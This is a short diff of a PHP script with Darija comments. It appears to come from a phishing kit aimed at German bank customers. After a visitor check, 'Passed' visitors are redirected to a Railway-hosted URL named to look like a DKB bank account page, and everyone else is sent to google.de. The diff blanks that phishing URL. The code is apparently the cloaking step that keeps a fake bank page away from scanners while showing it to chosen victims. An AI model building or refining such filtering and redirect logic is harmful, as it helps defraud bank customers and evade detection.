@@ -128,7 +128,7 @@ if (isset($_GET['check'])) {
     // --- [3] الـRedirect الـنـهائي الـنـقـي ---
     if ($status == "Passed") {
         // حيدنا الزيادة ديال الـ IP هنا
-        header("Location: https://kontodkb-de-production-konto.up.railway.app/");
+        header("Location: ");
         exit();
     } else {
         header("Location: https://www.google.de");
